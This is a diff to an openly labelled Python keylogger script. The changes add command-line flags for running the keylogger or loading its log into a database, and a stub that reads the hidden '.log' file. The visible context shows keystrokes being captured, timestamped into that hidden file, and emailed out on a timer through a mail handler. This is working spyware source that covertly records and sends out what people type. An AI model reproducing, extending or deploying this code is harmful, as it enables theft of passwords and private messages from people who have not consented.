@@ -4,6 +4,13 @@ from datetime import datetime
 import json
 import mail_handler as md
 from threading import Timer
+import argparse
+
+
+parser = argparse.ArgumentParser()
+parser.add_argument('--keylog', help='run keylogger.', action="store_true")
+parser.add_argument('--to_db', help='read log file and log into the database.', action="store_true")
+args = parser.parse_args()
 
 # define the path of log file.
 path = os.getcwd()
@@ -12,30 +19,19 @@ log_file = path + '/.log'
 send = True
 newTimer = False
 
-#
-# def get_send():
-#     return send
-#
-#
+
+def log_to_db():
+    log = ""
+    # read the log information into a list.
+    with open(log_file, 'r') as f:
+        log = f.read()
+    log = log.split('\n')[:-1]
+
+
 def is_send():
     global send
     send = True
-#
-#
-# def not_send(send):
-#     send = False
-#
-#
-# def get_newTimer():
-#     return newTimer
-#
-#
-# def is_newTimer(newTimer):
-#     newTimer = True
-#
-#
-# def not_newTimer(newTimer):
-#     newTimer = False
+
 
 """
 Class that processes some basic functions of a keylogger.
@@ -78,13 +74,14 @@ class Keylogger:
         now = datetime.now()
         current_time = now.strftime("%H:%M:%S")
         data = {
-            'msg': self.log,
-            'time': current_time
+            "msg": self.log,
+            "time": current_time
         }
         data = json.dumps(data)
         # put the logged message into the log file.
         with open(self.log_file, 'a') as f:
             f.write(data)
+            f.write('\n')
         # send email and clear temp log buffer.
         global send
         global newTimer
@@ -101,11 +98,16 @@ class Keylogger:
             keyboard_listener.join()
 
 
-kl = Keylogger()
-while 1:
-    kl.start()
-    # if send is False and new timer is True, we set a new timer.
-    if not send and newTimer:
-        t = Timer(20.0, is_send)
-        t.start()
-        newTimer = False
+if args.keylog:
+    kl = Keylogger()
+    while 1:
+        kl.start()
+        # if send is False and new timer is True, we set a new timer.
+        if not send and newTimer:
+            t = Timer(20.0, is_send)
+            t.start()
+            newTimer = False
+elif args.to_db:
+    log_to_db()
+else:
+    pass
